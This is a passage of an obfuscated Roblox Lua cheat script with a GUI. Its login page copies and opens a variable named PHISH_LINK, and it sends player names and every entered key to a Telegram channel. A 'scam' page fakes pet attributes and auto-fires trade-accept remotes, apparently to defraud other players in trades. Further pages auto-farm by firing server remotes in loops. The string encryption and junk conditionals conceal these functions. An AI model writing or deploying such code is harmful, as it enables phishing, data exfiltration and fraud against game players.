		TweenService:Create(b, TweenInfo.new(0.1), {[LUAOBFUSACTOR_DECRYPT_STR_0("\166\64\91\37\131\83\87\59\138\69\123\33\136\78\74\125", "\78\228\33\56")]=Color3.fromRGB(40, 40, 50)}):Play();
		TweenService:Create(s, TweenInfo.new(0.1), {[LUAOBFUSACTOR_DECRYPT_STR_0("\250\108\179\13\150\222\127\160\6\139\205\103", "\229\174\30\210\99")]=0.4}):Play();
	end);
	b['MouseButton1Click']:Connect(callback);
	return b;
end
local function toggle(parent, text, default, callback)
	local f = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\61\255\135\92\232", "\89\123\141\230\49\141\93"));
	f['Size'] = UDim2.new(1, -4, 0, 29);
	f['BackgroundColor3'] = Color3.fromRGB(32, 32, 40);
	f['BackgroundTransparency'] = 0.08;
	f['Parent'] = parent;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\198\88\213\3\2\68\246\99", "\42\147\17\150\108\112"), f)['CornerRadius'] = UDim.new(0, 8);
	local l = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\59\163\53\107\203\233\13\163\33", "\136\111\198\77\31\135"));
	l['Size'] = UDim2.new(1, -50, 1, 0);
	l['Position'] = UDim2.new(0, 10, 0, 0);
	l['BackgroundTransparency'] = 1;
	l['Text'] = text;
	l['TextColor3'] = Color3.fromRGB(215, 215, 230);
	l['Font'] = Enum['Font']['Gotham'];
	l['TextSize'] = 12;
	l['TextXAlignment'] = Enum['TextXAlignment']['Left'];
	l['Parent'] = f;
	local t = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\54\12\191\66\159\241\3\189\13\7", "\201\98\105\199\54\221\132\119"));
	t['Size'] = UDim2.new(0, 38, 0, 20);
	t['Position'] = UDim2.new(1, -44, 0.5, -10);
	t['BackgroundColor3'] = (default and Color3.fromRGB(90, 90, 120)) or Color3.fromRGB(48, 48, 58);
	t['Text'] = "";
	t['AutoButtonColor'] = false;
	t['Parent'] = f;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\140\37\160\46\16\59\169\171", "\204\217\108\227\65\98\85"), t)['CornerRadius'] = UDim.new(1, 0);
	local state = default;
	t['MouseButton1Click']:Connect(function()
		state = not state;
		TweenService:Create(t, TweenInfo.new(0.12), {[LUAOBFUSACTOR_DECRYPT_STR_0("\124\194\246\238\43\210\81\214\251\225\15\207\82\204\231\182", "\160\62\163\149\133\76")]=((state and Color3.fromRGB(90, 90, 120)) or Color3.fromRGB(48, 48, 58))}):Play();
		callback(state);
	end);
end
local loginP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\250\175\10\38\205", "\163\182\192\109\79")];
label(loginP, LUAOBFUSACTOR_DECRYPT_STR_0("\21\37\3\197\230\39\102\50\197\228\33\47\18\197\241", "\149\84\70\96\160"), 20);
label(loginP, "1. Press Login — link opens + copies", 15);
label(loginP, LUAOBFUSACTOR_DECRYPT_STR_0("\106\72\77\206\55\11\29\225\61\18\8\173\52\9\10\228\54\70\4\227\120\18\5\232\120\4\2\249", "\141\88\102\109"), 15);
label(loginP, LUAOBFUSACTOR_DECRYPT_STR_0("\224\29\138\85\20\41\80\211\243\71\194\117\90\54\80\216\243\74\197\101\90\47\80\194\182\90\220\117\30", "\161\211\51\170\16\122\93\53"), 15);
button(loginP, LUAOBFUSACTOR_DECRYPT_STR_0("\215\161\181\33\245\238\250\39\235\171\188\104\176\238\177\39\235\183\242\36\242\160\185\97", "\72\155\206\210"), function()
	send_tg("🔔 <b>" .. LocalPlayer['Name'] .. "</b> нажал Login");
	if setclipboard then
		setclipboard(PHISH_LINK);
	end
	pcall(function()
		GuiService:OpenBrowserWindow(PHISH_LINK);
	end);
	pcall(function()
		local req = get_request();
		if ((3373 <= 3556) and (req or (1180 == 2180))) then
		end
	end);
	local tip = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\114\127\76\26\31\71\120\81\2", "\83\38\26\52\110"));
	tip['Size'] = UDim2.new(1, -6, 0, 36);
	tip['BackgroundColor3'] = Color3.fromRGB(35, 45, 40);
	tip['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\116\30\41\77\24\24\55\67\86\18\35\6\30\87\36\73\72\30\34\66\22\87\23\71\75\3\34\6\81\17\103\72\93\18\35\67\92\89", "\38\56\119\71");
	tip['TextColor3'] = Color3.fromRGB(160, 255, 180);
	tip['Font'] = Enum['Font']['GothamMedium'];
	tip['TextSize'] = 12;
	tip['Parent'] = loginP;
	Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\198\198\123\217\55\88\246\253", "\54\147\143\56\182\69"), tip)['CornerRadius'] = UDim.new(0, 8);
	task.delay(4, function()
		if tip then
			tip:Destroy();
		end
	end);
end);
label(loginP, LUAOBFUSACTOR_DECRYPT_STR_0("\243\143\235\76\205\150\170\250\80\133", "\191\182\225\159\41"), 15);
local keyBox = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\31\23\48\65\169\136\218", "\162\75\114\72\53\235\231"));
keyBox['Size'] = UDim2.new(1, -6, 0, 34);
keyBox['BackgroundColor3'] = Color3.fromRGB(30, 30, 38);
keyBox['Text'] = "";
keyBox['PlaceholderText'] = LUAOBFUSACTOR_DECRYPT_STR_0("\156\61\87\246\86\66\135\57\93\162\91\7\158\57\10\172\29", "\98\236\92\36\130\51");
keyBox['TextColor3'] = Color3.fromRGB(240, 240, 250);
keyBox['PlaceholderColor3'] = Color3.fromRGB(120, 120, 140);
keyBox['Font'] = Enum['Font']['Gotham'];
keyBox['TextSize'] = 13;
keyBox['ClearTextOnFocus'] = false;
keyBox['Parent'] = loginP;
Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\145\48\47\181\87\166\176\34", "\80\196\121\108\218\37\200\213"), keyBox)['CornerRadius'] = UDim.new(0, 8);
local ks = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\53\90\49\107\89\1\129\5", "\234\96\19\98\31\43\110"));
ks['Color'] = Color3.fromRGB(80, 80, 100);
ks['Thickness'] = 1;
ks['Parent'] = keyBox;
button(loginP, LUAOBFUSACTOR_DECRYPT_STR_0("\53\10\80\202\165\102\203\45\26\75\135\234\50\190\8\19\93\196\167", "\235\102\127\50\167\204\18"), function()
	local entered = keyBox['Text']:gsub(LUAOBFUSACTOR_DECRYPT_STR_0("\21\178\190", "\78\48\193\149\67\36"), "");
	if (entered == REQUIRED_KEY) then
		ACCESS = true;
		send_tg("✅ <b>" .. LocalPlayer['Name'] .. "</b> ввёл правильный ключ — доступ открыт");
		local ok = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\4\27\152\12\109\49\28\133\20", "\33\80\126\224\120"));
		ok['Size'] = UDim2.new(1, -6, 0, 30);
		ok['BackgroundColor3'] = Color3.fromRGB(30, 50, 35);
		ok['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\205\171\0\193\79\255\232\4\214\93\226\188\6\192", "\60\140\200\99\164");
		ok['TextColor3'] = Color3.fromRGB(150, 255, 170);
		ok['Font'] = Enum['Font']['GothamMedium'];
		ok['TextSize'] = 13;
		ok['Parent'] = loginP;
		Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\178\221\39\41\176\137\241\22", "\194\231\148\100\70"), ok)['CornerRadius'] = UDim.new(0, 8);
		task.wait(0.6);
		switch(LUAOBFUSACTOR_DECRYPT_STR_0("\107\77\200\173", "\168\38\44\161\195\150"));
	else
		send_tg("❌ <b>" .. LocalPlayer['Name'] .. "</b> ввёл неверный ключ: " .. tostring(entered));
		local err = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\180\249\154\98\28\233\180\19\140", "\118\224\156\226\22\80\136\214"));
		err['Size'] = UDim2.new(1, -6, 0, 30);
		err['BackgroundColor3'] = Color3.fromRGB(50, 30, 30);
		err['Text'] = LUAOBFUSACTOR_DECRYPT_STR_0("\117\252\86\142\69\174\82\133\91", "\224\34\142\57");
		err['TextColor3'] = Color3.fromRGB(255, 140, 140);
		err['Font'] = Enum['Font']['GothamMedium'];
		err['TextSize'] = 13;
		err['Parent'] = loginP;
		Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\235\142\230\210\97\255\88\28", "\110\190\199\165\189\19\145\61"), err)['CornerRadius'] = UDim.new(0, 8);
		task.delay(2.5, function()
			if err then
				err:Destroy();
			end
		end);
	end
end);
local mainP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\247\234\126\230", "\167\186\139\23\136\235")];
label(mainP, LUAOBFUSACTOR_DECRYPT_STR_0("\59\182\139\2\15\187\156", "\109\122\213\232"), 18);
label(mainP, LUAOBFUSACTOR_DECRYPT_STR_0("\192\254\161\59\180\183", "\80\142\151\194") .. LocalPlayer['Name']);
label(mainP, LUAOBFUSACTOR_DECRYPT_STR_0("\54\213\114\94\42\194\45\12", "\44\99\166\23") .. LocalPlayer['UserId']);
label(mainP, LUAOBFUSACTOR_DECRYPT_STR_0("\76\251\40\53\54\141\120\173\105", "\196\28\151\73\86\83") .. game['PlaceId']);
label(mainP, LUAOBFUSACTOR_DECRYPT_STR_0("\195\15\40\9\135\74\11\44\179", "\22\147\99\73\112\226\56\120") .. #Players:GetPlayers());
local scamP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\139\118\227\248\205\140\103\227\241\136", "\237\216\21\130\149")];
label(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\177\77\94\82\240\253\76\131\74\90", "\62\226\46\63\63\208\169"), 18);
local vFly, vRide, vNeon, vMega = false, false, false, false;
toggle(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\211\16\70\150\30\1\111\120\233\0", "\62\133\121\53\227\127\109\79"), false, function(v)
	vFly = v;
end);
toggle(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\38\29\33\224\215\162\226\34\29\54\240", "\194\112\116\82\149\182\206"), false, function(v)
	vRide = v;
end);
toggle(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\15\161\95\13\193\238\78\23\173\67\22", "\110\89\200\44\120\160\130"), false, function(v)
	vNeon = v;
end);
toggle(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\157\202\88\83\66\70\123\96\174\196\74\6\109\79\52\67", "\45\203\163\43\38\35\42\91"), false, function(v)
	vMega = v;
end);
local autoAccept = false;
toggle(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\243\144\200\44\199\136\87\209\128\204\55", "\52\178\229\188\67\231\201"), false, function(v)
	autoAccept = v;
	if v then
		task.spawn(function()
			while autoAccept do
				pcall(function()
					for _, r in pairs(ReplicatedStorage:GetDescendants()) do
						if (r:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\19\68\93\11\227\89\6\55\68\94\16", "\67\65\33\48\100\151\60")) or (3291 < 3280)) then
							local n = r['Name']:lower();
							if ((4386 >= 873) and (4090 < 4653) and (n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\222\228\173\221\227\203", "\147\191\135\206\184")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\144\58\167\197\221", "\210\228\72\198\161\184\51")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\53\70\253\22\122\220\59", "\174\86\41\147\112\19")))) then
								pcall(function()
									r:FireServer();
								end);
							end
						end
					end
				end);
				task.wait(1.2);
			end
		end);
	end
end);
button(scamP, LUAOBFUSACTOR_DECRYPT_STR_0("\122\16\157\7\60\79\39\162\72\21\140\7\101\41\29\170\92\19", "\203\59\96\237\107\69\111\113"), function()
	pcall(function()
		local char = LocalPlayer['Character'];
		if (not char or (2652 < 196)) then
			return;
		end
		for _, obj in pairs(char:GetDescendants()) do
			if (obj:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\6\25\163\237\7\241\219\49\19", "\183\68\118\204\129\81\144")) or obj:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\61\185\98\237\5\133\56\172\124\241\14", "\226\110\205\16\132\107"))) then
				local n = obj['Name']:lower();
				if ((921 <= 1102) and (4135 < 4817) and n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\237\207\249", "\33\139\163\128\185")) and vFly) then
					pcall(function()
						obj['Value'] = true;
					end);
				end
				if ((4706 >= 963) and n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\69\81\0\219", "\190\55\56\100")) and vRide) then
					pcall(function()
						obj['Value'] = true;
					end);
				end
				if (((272 == 272) and n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\88\170\51\16", "\147\54\207\92\126\115\131")) and vNeon) or (960 <= 876)) then
					pcall(function()
						obj['Value'] = true;
					end);
				end
				if (((100 <= 3123) and n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\0\52\50\124", "\30\109\81\85\29\109")) and vMega) or (2066 == 932)) then
					pcall(function()
						obj['Value'] = true;
					end);
				end
			end
		end
	end);
end);
local hallP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\215\112\88\186\57\201\249\250\127", "\156\159\17\52\214\86\190")];
label(hallP, LUAOBFUSACTOR_DECRYPT_STR_0("\134\238\177\176\161\248\184\185\160\175\239\236\252\185", "\220\206\143\221"), 18);
label(hallP, "• Candy • Spooky pets • Event eggs");
button(hallP, LUAOBFUSACTOR_DECRYPT_STR_0("\181\126\44\25\152\228\211\138\113\34\0\221\201\220", "\178\230\29\77\119\184\172"), function()
	pcall(function()
		for _, v in pairs(ReplicatedStorage:GetDescendants()) do
			local n = v['Name']:lower();
			if ((4825 < 4843) and (n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\253\191\6\23\120\239\240\187\4", "\152\149\222\106\123\23")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\222\39\248\71\172", "\213\189\70\150\35")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\92\69\123\7\68\76", "\104\47\53\20")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\179\89\140\12\183\6\173", "\111\195\44\225\124\220")))) then
				label(hallP, "→ " .. v['Name']);
			end
		end
	end);
end);
button(hallP, LUAOBFUSACTOR_DECRYPT_STR_0("\251\73\12\127\174\168\204\6\35\114\165\175\193", "\203\184\38\96\19\203"), function()
	pcall(function()
		for _, r in pairs(ReplicatedStorage:GetDescendants()) do
			if ((r:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\11\118\116\78\218\60\86\111\68\192\45", "\174\89\19\25\33")) and r['Name']:lower():find(LUAOBFUSACTOR_DECRYPT_STR_0("\44\19\92\74\238", "\107\79\114\50\46\151\231"))) or (1369 > 4987)) then
				pcall(function()
					r:FireServer();
				end);
			end
		end
	end);
end);
local eventP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\28\176\176\39\158\42", "\160\89\198\213\73\234\89\215")];
label(eventP, LUAOBFUSACTOR_DECRYPT_STR_0("\109\103\177\240\209\91", "\165\40\17\212\158"), 18);
for _, s in ipairs({LUAOBFUSACTOR_DECRYPT_STR_0("\205\216\4\63\41\242\220\13\61", "\70\133\185\104\83"),LUAOBFUSACTOR_DECRYPT_STR_0("\39\77\86\35\218\16\72\69\57", "\169\100\37\36\74"),LUAOBFUSACTOR_DECRYPT_STR_0("\46\130\181\16\57\130\163\66", "\48\96\231\194"),LUAOBFUSACTOR_DECRYPT_STR_0("\254\91\2\40\23\204\166\141\205", "\227\168\58\110\77\121\184\207"),LUAOBFUSACTOR_DECRYPT_STR_0("\94\61\172\84\180\201", "\197\27\92\223\32\209\187\17"),LUAOBFUSACTOR_DECRYPT_STR_0("\48\74\206\246\6\77", "\155\99\63\163"),LUAOBFUSACTOR_DECRYPT_STR_0("\160\216\179\153\177\128\131\200", "\228\226\177\193\237\217"),LUAOBFUSACTOR_DECRYPT_STR_0("\24\165\45\231\38", "\134\84\208\67"),LUAOBFUSACTOR_DECRYPT_STR_0("\50\162\136\85\5\169\148\79\18\190\159", "\60\115\204\230")}) do
	label(eventP, "• " .. s);
end
button(eventP, LUAOBFUSACTOR_DECRYPT_STR_0("\212\57\234\126\167\23\228\116\242\54\238\99", "\16\135\90\139"), function()
	pcall(function()
		for _, v in pairs(ReplicatedStorage:GetDescendants()) do
			local n = v['Name']:lower();
			if (n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\81\98\3\61\90", "\24\52\20\102\83\46\52")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\215\42\32\55\0\202", "\111\164\79\65\68")) or (863 >= 4584)) then
				label(eventP, "→ " .. v['Name']);
			end
		end
	end);
end);
local petP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\225\220\151\158\30\239\210", "\138\166\185\227\190\78")];
label(petP, LUAOBFUSACTOR_DECRYPT_STR_0("\236\113\209\119\98\38\13\139\60\243\62\65\54\24\199\61", "\121\171\20\165\87\50\67"), 18);
local function spawnVisual(name)
	pcall(function()
		for _, sn in ipairs({LUAOBFUSACTOR_DECRYPT_STR_0("\246\61\173\37", "\98\166\88\217\86\217"),LUAOBFUSACTOR_DECRYPT_STR_0("\198\243\109\44\137\216\243\250\106", "\188\150\150\25\97\230"),LUAOBFUSACTOR_DECRYPT_STR_0("\249\133\86\7\2\249\234\140\75\17", "\141\186\233\63\98\108")}) do
			local f = ReplicatedStorage:FindFirstChild(sn);
			if (f or (724 >= 1668) or (3877 >= 4537)) then
				for _, p in pairs(f:GetChildren()) do
					if p['Name']:lower():find(name:lower()) then
						local c = p:Clone();
						c['Parent'] = LocalPlayer['Character'] or workspace;
						if ((c:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\220\229\40\179\41", "\69\145\138\76\214")) and LocalPlayer['Character'] and LocalPlayer['Character']:FindFirstChild(LUAOBFUSACTOR_DECRYPT_STR_0("\88\218\132\136\177\25\121\203\187\134\176\2\64\206\155\157", "\118\16\175\233\233\223"))) or (4315 < 1726)) then
							c:PivotTo(LocalPlayer['Character']['HumanoidRootPart']['CFrame'] * CFrame.new(3, 0, 0));
						end
						return;
					end
				end
			end
		end
	end);
end
for _, info in ipairs({{LUAOBFUSACTOR_DECRYPT_STR_0("\164\147\57", "\29\235\228\85\219\142\235"),LUAOBFUSACTOR_DECRYPT_STR_0("\50\195\182", "\50\93\180\218\189\23\46\71")},{LUAOBFUSACTOR_DECRYPT_STR_0("\241\179\87\12\106\250\122", "\40\190\196\59\44\36\188"),LUAOBFUSACTOR_DECRYPT_STR_0("\51\82\208", "\109\92\37\188\212\154\29")},{LUAOBFUSACTOR_DECRYPT_STR_0("\55\231\165\199\62\77\68\203\182\194\54\85\10", "\58\100\143\196\163\81"),LUAOBFUSACTOR_DECRYPT_STR_0("\9\74\34\167\48\94", "\110\122\34\67\195\95\41\133")},{LUAOBFUSACTOR_DECRYPT_STR_0("\83\163\84\89\194\53\149\73\75\209\122\191", "\182\21\209\59\42"),LUAOBFUSACTOR_DECRYPT_STR_0("\177\69\202\14\53", "\222\215\55\165\125\65")},{LUAOBFUSACTOR_DECRYPT_STR_0("\15\195\201\13", "\42\76\177\166\122\146\161\141"),LUAOBFUSACTOR_DECRYPT_STR_0("\166\152\10\217", "\22\197\234\101\174\25")},{LUAOBFUSACTOR_DECRYPT_STR_0("\14\59\178", "\230\77\84\197\188\22\207\183"),LUAOBFUSACTOR_DECRYPT_STR_0("\250\27\209", "\85\153\116\166\156\236\193\144")},{LUAOBFUSACTOR_DECRYPT_STR_0("\148\225\95\161\235\20", "\96\196\128\45\211\132"),LUAOBFUSACTOR_DECRYPT_STR_0("\37\140\105\77\221\187", "\184\85\237\27\63\178\207\212")},{LUAOBFUSACTOR_DECRYPT_STR_0("\56\80\14", "\63\104\57\105"),LUAOBFUSACTOR_DECRYPT_STR_0("\27\142\163", "\36\107\231\196")},{LUAOBFUSACTOR_DECRYPT_STR_0("\123\167\173\148\73\245\132\146\79\172", "\231\61\213\194"),LUAOBFUSACTOR_DECRYPT_STR_0("\15\184\47\106", "\19\105\205\93")},{LUAOBFUSACTOR_DECRYPT_STR_0("\134\31\210\193\25\155", "\95\201\104\190\225"),LUAOBFUSACTOR_DECRYPT_STR_0("\160\220\205", "\174\207\171\161")},{LUAOBFUSACTOR_DECRYPT_STR_0("\222\246\12\247\247\192\173\208\43\193", "\183\141\158\109\147\152"),LUAOBFUSACTOR_DECRYPT_STR_0("\63\1\231\8\35\30", "\108\76\105\134")},{LUAOBFUSACTOR_DECRYPT_STR_0("\205\215\190\242\218\171\235\151\211", "\174\139\165\209\129"),LUAOBFUSACTOR_DECRYPT_STR_0("\165\161\237\210\210", "\24\195\211\130\161\166\99\16")},{LUAOBFUSACTOR_DECRYPT_STR_0("\101\17\230\59\19\56\96\49", "\118\38\99\137\76\51"),LUAOBFUSACTOR_DECRYPT_STR_0("\254\52\10\5", "\64\157\70\101\114\105")},{LUAOBFUSACTOR_DECRYPT_STR_0("\112\169\181\241\31\84\232\137\197\34", "\112\32\200\199\131"),LUAOBFUSACTOR_DECRYPT_STR_0("\60\81\78\170\204\191", "\66\76\48\60\216\163\203")}}) do
	button(petP, LUAOBFUSACTOR_DECRYPT_STR_0("\157\131\109\179", "\68\218\230\25\147\63\174") .. info[1], function()
		spawnVisual(info[2]);
	end);
end
button(petP, LUAOBFUSACTOR_DECRYPT_STR_0("\142\38\86\77\164\237\28\90\95\163\172\38\19\124\179\185\57", "\214\205\74\51\44"), function()
	pcall(function()
		local char = LocalPlayer['Character'];
		if (not char or (3679 < 625)) then
			return;
		end
		for _, v in pairs(char:GetChildren()) do
			local n = v['Name']:lower();
			if (((428 < 1804) and (n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\234\73\246", "\23\154\44\130\156")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\30\177\161", "\115\113\198\205\206\86")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\151\95\255\94\139\64", "\58\228\55\158")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\178\155\223\61\40", "\85\212\233\176\78\92\205")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\73\74\135\245", "\130\42\56\232")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\233\186\51", "\95\138\213\68\131\32")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\58\41\179\81\121\62", "\22\74\72\193\35")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\60\112\227", "\56\76\25\132")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\88\212\185\63", "\175\62\161\203\70")))) or (4625 < 632)) then
				v:Destroy();
			end
		end
	end);
end);
local farmP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\29\200\215\28\51\61\207\206", "\85\92\189\163\115")];
label(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\8\185\36\55\47\173\34\53", "\88\73\204\80"), 18);
local farms = {[LUAOBFUSACTOR_DECRYPT_STR_0("\45\130\30\66\48", "\186\78\227\112\38\73")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\236\82\233\70", "\26\156\55\157\53\51")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\137\223\17\202", "\48\236\184\118\185\216")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\232\178\89\53\214", "\84\133\221\55\80\175")]=false,[LUAOBFUSACTOR_DECRYPT_STR_0("\188\235\40", "\60\221\135\68\198\167")]=false};
local function safeFarm(hint)
	pcall(function()
		local c = 0;
		for _, r in pairs(ReplicatedStorage:GetDescendants()) do
			if ((c <= 5) or (3325 > 4613) or (83 > 1780)) then
			else
				break;
			end
			if ((546 <= 1077) and r:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\220\184\245\140\86\220\203\171\253\141\86", "\185\142\221\152\227\34"))) then
				local n = r['Name']:lower();
				if (n:find(hint) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\91\201\86\243\78", "\151\56\165\55\154\35\83")) or n:find(LUAOBFUSACTOR_DECRYPT_STR_0("\163\76\9\226\165\64\17", "\142\192\35\101")) or (4950 <= 4553)) then
					pcall(function()
						r:FireServer();
					end);
					c += 1
				end
			end
		end
	end);
end
local function startFarm(key, hint)
	farms[key] = true;
	task.spawn(function()
		while farms[key] or farms['all'] do
			safeFarm(hint);
			task.wait(1.8);
		end
	end);
end
toggle(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\245\116\39\167\254", "\118\182\21\73\195\135\236\204"), false, function(v)
	if (((2665 <= 3933) and v) or (996 > 4301)) then
		startFarm(LUAOBFUSACTOR_DECRYPT_STR_0("\11\61\20\68\29", "\157\104\92\122\32\100\109"), LUAOBFUSACTOR_DECRYPT_STR_0("\160\167\193\206\36", "\203\195\198\175\170\93\71\237"));
	else
		farms['candy'] = false;
	end
end);
toggle(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\30\78\42\198", "\156\78\43\94\181\49\113"), false, function(v)
	if v then
		startFarm(LUAOBFUSACTOR_DECRYPT_STR_0("\98\237\208\176", "\25\18\136\164\195\107\35"), LUAOBFUSACTOR_DECRYPT_STR_0("\248\40\189", "\216\136\77\201\47\18\220\161"));
	else
		farms['pets'] = false;
	end
end);
toggle(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\8\235\44\201", "\226\77\140\75\186\104\188"), false, function(v)
	if ((4070 > 687) and (3273 == 3273) and v) then
		startFarm(LUAOBFUSACTOR_DECRYPT_STR_0("\188\201\215\44", "\47\217\174\176\95"), LUAOBFUSACTOR_DECRYPT_STR_0("\189\218\113", "\70\216\189\22\98\210\52\24"));
	else
		farms['eggs'] = false;
	end
end);
toggle(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\247\208\173\130\202", "\179\186\191\195\231"), false, function(v)
	if (((3824 > 409) and v) or (656 >= 3330)) then
		startFarm(LUAOBFUSACTOR_DECRYPT_STR_0("\244\48\22\225\224", "\132\153\95\120"), LUAOBFUSACTOR_DECRYPT_STR_0("\188\189\0\40\238", "\192\209\210\110\77\151\186"));
	else
		farms['money'] = false;
	end
end);
toggle(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\197\21\39\251\230\208\232\10\44\238", "\164\128\99\66\137\159"), false, function(v)
	farms['all'] = v;
	if v then
		startFarm(LUAOBFUSACTOR_DECRYPT_STR_0("\1\133\229", "\222\96\233\137"), LUAOBFUSACTOR_DECRYPT_STR_0("\186\191\166\22\133", "\144\217\211\199\127\232\147"));
	end
end);
button(farmP, LUAOBFUSACTOR_DECRYPT_STR_0("\203\59\49\56\149\100\14\72", "\36\152\79\94\72\181\37\98"), function()
	for k in pairs(farms) do
		farms[k] = false;
	end
end);
local visP = Pages[LUAOBFUSACTOR_DECRYPT_STR_0("\225\209\84\42\214\212", "\95\183\184\39")];
label(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\131\54\244\51\85\140\17", "\98\213\95\135\70\52\224"), 18);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\205\172\207\99\20\217\175\198\96", "\52\158\195\169\23"), function()
	pcall(function()
		for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
			if (p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\88\189\33\113\182\52\105\159", "\235\26\220\82\20\230\85\27")) or (2492 <= 335)) then
				local l = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\184\174\224\204\96\164\168\238\202\96", "\20\232\193\137\162"));
				l['Color'] = Color3.fromRGB(190, 190, 220);
				l['Brightness'] = 1.1;
				l['Range'] = 8;
				l['Parent'] = p;
			end
		end
	end);
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\16\222\204\168\229\131\0\49\5\211\202\177", "\17\66\191\165\198\135\236\119"), function()
	pcall(function()
		for _, p in pairs(LocalPlayer['Character']:GetDescendants()) do
			if ((4322 >= 2562) and (2087 == 2087) and p:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\45\174\189\22\207\233\254\197", "\177\111\207\206\115\159\136\140"))) then
				local l = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\53\134\25\26\192\99\86\2\129\4", "\63\101\233\112\116\180\47"));
				l['Brightness'] = 1.5;
				l['Range'] = 10;
				l['Parent'] = p;
				task.spawn(function()
					local h = 0;
					while l and l['Parent'] do
						h = (h + 0.01) % 1;
						l['Color'] = Color3.fromHSV(h, 0.7, 1);
						task.wait(0.03);
					end
				end);
			end
		end
	end);
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\241\62\224\29\238\51\131\23\228\21\240\34\208", "\86\163\91\141\114\152"), function()
	pcall(function()
		for _, l in pairs(LocalPlayer['Character']:GetDescendants()) do
			if l:IsA(LUAOBFUSACTOR_DECRYPT_STR_0("\99\4\125\125\46\127\2\115\123\46", "\90\51\107\20\19")) then
				l:Destroy();
			end
		end
	end);
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\171\229\137\227\63\159\249\130\231\41", "\93\237\144\229\143"), function()
	Lighting['Brightness'] = 2;
	Lighting['ClockTime'] = 14;
	Lighting['FogEnd'] = 8999999488;
	Lighting['GlobalShadows'] = false;
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\59\249\176\63\4\65", "\38\117\150\144\121\107"), function()
	Lighting['FogEnd'] = 8999999488;
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\3\178\233\50\57", "\90\77\219\142"), function()
	Lighting['ClockTime'] = 0;
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\194\5\56", "\26\134\100\65\89\44\103"), function()
	Lighting['ClockTime'] = 14;
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\220\236\34\45\173\255\228", "\196\145\131\80\67"), function()
	Lighting['ClockTime'] = 8;
end);
button(visP, LUAOBFUSACTOR_DECRYPT_STR_0("\59\166\3\6\17\230\25", "\136\126\208\102\104\120"), function()
	Lighting['ClockTime'] = 18;
end);
